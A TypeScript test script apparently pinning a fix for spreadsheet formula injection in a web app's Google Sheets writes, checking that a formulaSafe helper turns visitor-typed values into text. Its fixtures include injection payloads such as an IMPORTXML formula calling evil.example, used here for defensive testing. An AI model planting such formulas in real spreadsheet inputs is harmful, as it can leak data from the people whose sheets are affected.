// Run from project root: npx tsx src/scripts/test-sheet-formulas.ts
//
// Pins backlog #84 part 4 (backlog #33; audit follow-up, owner 2026-11-14):
// every value a visitor typed, in every Sheet write, lands as text and can
// never run as a formula. One shared helper, formulaSafe, adds a leading
// apostrophe when a value starts with = + - @, a tab or a carriage return —
// the way the intake row's columns 23–29 already were — and leaves every
// other value, and every value the app writes itself, exactly as it was.
// The intake row (columns 1–22, 29 in all) is pinned in test-intake-row.ts;
// this covers the helper, /api/enroll, the newsletter, program interest and
// the assessments tab, including the in-place rewrite of a row read back.
//
// Pure: it calls pure functions and reads source files. No network, no
// Sheets, no env. Exits non-zero on any failure.

import { readFileSync } from "node:fs";
import { join } from "node:path";
import {
  FORMULA_LEADS,
  assessmentFrozenRewrite,
  assessmentSheetRow,
  enrollmentSheetRow,
  formulaSafe,
  newsletterSheetRow,
  programInterestSheetRow,
} from "../lib/sheetText";

let failures = 0;
function check(name: string, actual: unknown, expected: unknown = true) {
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  if (a === e) {
    console.log(`  ✓ ${name}`);
  } else {
    failures++;
    console.error(`  ✗ ${name}
      expected ${e}
      got      ${a}`);
  }
}

const ROOT = process.cwd();
// Either line ending: this repo is checked out with CRLF on Windows.
const read = (path: string) => readFileSync(join(ROOT, path), "utf8").replace(/\r\n/g, "\n");
const TS = "2026-11-20T15:00:00.000Z";

console.log("formulaSafe — the one rule");
{
  check("the six leading characters", [...FORMULA_LEADS], ["=", "+", "-", "@", "\t", "\r"]);
  check("=1+1 → '=1+1", formulaSafe("=1+1"), "'=1+1");
  check("+1 416 555 0100 → '+1 416 555 0100 (shown as typed)", formulaSafe("+1 416 555 0100"), "'+1 416 555 0100");
  check("-1 → '-1", formulaSafe("-1"), "'-1");
  check("@SUM(A1) → '@SUM(A1)", formulaSafe("@SUM(A1)"), "'@SUM(A1)");
  check("a leading tab → text", formulaSafe("\t=1"), "'\t=1");
  check("a leading carriage return → text", formulaSafe("\r=1"), "'\r=1");
  check("an ordinary name is unchanged", formulaSafe("Maya Chen"), "Maya Chen");
  check("an email is unchanged", formulaSafe("maya@example.com"), "maya@example.com");
  check("a phone without + is unchanged", formulaSafe("(647) 555-1234"), "(647) 555-1234");
  check("= inside, not at the start, is unchanged", formulaSafe("a=b"), "a=b");
  check("an empty string stays empty", formulaSafe(""), "");
  check("a number passes through", formulaSafe(42), 42);
  check("null passes through", formulaSafe(null), null);
  check("undefined passes through", formulaSafe(undefined) === undefined);
}

console.log("/api/enroll — the enrollments tab row (A–U)");
{
  const base = {
    timestamp: TS,
    cohortId: "coh_1",
    program: "Adult Bootcamps",
    location: "newtonbrook",
    playerName: "Maya Chen",
    dob: "2014-03-02",
    isMinor: true,
    contactEmail: "dana@example.com",
    contactPhone: "(647) 555-1234",
    guardianName: "Dana Chen",
    guardianEmail: "dana@example.com",
    guardianPhone: "(647) 555-1234",
    consentSignedName: "Dana Chen",
    consentAgreedAt: "2026-11-20T14:59:00.000Z",
    waiverVersion: "v0",
    accountEmail: "dana@example.com",
    accountName: "Dana Chen",
    relationship: "child",
    participantId: "",
  };
  const plain = enrollmentSheetRow(base);
  check("21 cells", plain.length, 21);
  check("ordinary values are written as typed, the app's cells as the app sets them", plain, [
    TS, "coh_1", "Adult Bootcamps", "newtonbrook", "Maya Chen", "2014-03-02", "yes",
    "dana@example.com", "(647) 555-1234", "Dana Chen", "dana@example.com", "(647) 555-1234",
    "Dana Chen", "2026-11-20T14:59:00.000Z", "v0", "pending", "",
    "dana@example.com", "Dana Chen", "child", "",
  ]);
  const typed = enrollmentSheetRow({
    ...base,
    playerName: "=IMPORTXML(\"https://evil.example\",\"//a\")",
    contactPhone: "+1 416 555 0100",
    guardianName: "@x",
    consentSignedName: "-Dana",
    accountName: "=1+1",
  });
  check("a typed player name never runs", typed[4], "'=IMPORTXML(\"https://evil.example\",\"//a\")");
  check("a +1 phone is text", typed[8], "'+1 416 555 0100");
  check("a guardian name starting with @ is text", typed[9], "'@x");
  check("a signature starting with - is text", typed[12], "'-Dana");
  check("the account name (col 19) is text", typed[18], "'=1+1");
  check("status and credit stay the app's", [typed[15], typed[16]], ["pending", ""]);
  check("a missing value is blank, as before", enrollmentSheetRow({ ...base, dob: undefined, guardianName: null })[5], "");
}

console.log("Newsletter and program interest (A–C)");
{
  check("newsletter: ordinary", newsletterSheetRow(TS, "dana@example.com", "homepage_email_capture"), [TS, "dana@example.com", "homepage_email_capture"]);
  check("newsletter: a typed source never runs", newsletterSheetRow(TS, "dana@example.com", "=HYPERLINK(\"x\")")[2], "'=HYPERLINK(\"x\")");
  check("newsletter: an address starting with - is text", newsletterSheetRow(TS, "-a@example.com", "x")[1], "'-a@example.com");
  check("program interest: ordinary", programInterestSheetRow(TS, "dana@example.com", "bootcamps"), [TS, "dana@example.com", "bootcamps"]);
  check("program interest: a typed program never runs", programInterestSheetRow(TS, "dana@example.com", "+1")[2], "'+1");
}

console.log("Assessments tab (A–P), and the in-place rewrite");
{
  const row = assessmentSheetRow(
    {
      name: "=1+1",
      email: "dana@example.com",
      phone: "+1 416 555 0100",
      slotDate: "2026-11-28",
      slotStart: "10:00",
      status: "booked",
      paid: true,
      creditStatus: "unused",
      accountEmail: "dana@example.com",
      accountName: "@Dana",
      participantName: "=1+1",
      participantRelationship: "child",
      participantId: "p_1",
    },
    TS
  );
  check("16 cells", row.length, 16);
  check("the player's name is text", row[1], "'=1+1");
  check("the phone is text", row[3], "'+1 416 555 0100");
  check("the slot, status, paid and credit are the app's", [row[4], row[5], row[6], row[7], row[10]], ["2026-11-28", "10:00", "booked", "yes", "unused"]);
  check("household cells a visitor typed are text", [row[12], row[13]], ["'@Dana", "'=1+1"]);
  check("a test payment reads test", assessmentSheetRow({ name: "Maya", email: "d@example.com", slotDate: "", slotStart: "", status: "booked", paid: "test" }, TS)[7], "test");

  // updateAssessmentRow reads the row back as Sheets shows it — without the
  // apostrophe — and writes the frozen block again: the visitor's cells are
  // made safe again on the way back, or a formula would come alive.
  const readBack = [TS, "=1+1", "dana@example.com", "+1 416 555 0100", "2026-11-28", "10:00", "booked", "yes", "", "", "unused"];
  const rewritten = assessmentFrozenRewrite(readBack, {
    status: "completed",
    levelResult: "3.0",
    coachNotes: "=steady forehand",
    creditStatus: "unused",
  });
  check("11 cells (A–K, the frozen block only)", rewritten.length, 11);
  check("the name read back is text again", rewritten[1], "'=1+1");
  check("the phone read back is text again", rewritten[3], "'+1 416 555 0100");
  check("the coach's note is text", rewritten[9], "'=steady forehand");
  check("the new status and level land", [rewritten[6], rewritten[8]], ["completed", "3.0"]);
  check("paid is left as read when not given", rewritten[7], "yes");
}

console.log("Source — every Sheet append goes through the safe rows");
{
  const enroll = read("src/app/api/enroll/route.ts");
  check("/api/enroll builds its rows with enrollmentSheetRow", enroll.includes("enrollmentSheetRow({"));
  const news = read("src/app/api/newsletter/route.ts");
  check("/api/newsletter builds its row with newsletterSheetRow", news.includes("newsletterSheetRow("));
  const interest = read("src/app/api/program-interest/route.ts");
  check("/api/program-interest builds its row with programInterestSheetRow", interest.includes("programInterestSheetRow("));
  const sheet = read("src/lib/assessmentSheet.ts");
  check("the assessments append uses assessmentSheetRow", sheet.includes("assessmentSheetRow(r"));
  check("the in-place update uses assessmentFrozenRewrite", sheet.includes("assessmentFrozenRewrite("));
  const intake = read("src/lib/intakeRow.ts");
  check("the intake row uses formulaSafe", intake.includes("formulaSafe("));
  for (const [file, src] of [
    ["src/app/api/enroll/route.ts", enroll],
    ["src/app/api/newsletter/route.ts", news],
    ["src/app/api/program-interest/route.ts", interest],
  ] as const) {
    check(`${file}: no row built from the body inline`, /values: \[\[\s*new Date\(\)\.toISOString\(\),\s*body\./.test(src), false);
  }
}

if (failures > 0) {
  console.error(`\n${failures} check(s) failed.`);
  process.exit(1);
}
console.log("\nAll Sheet formula checks passed.");
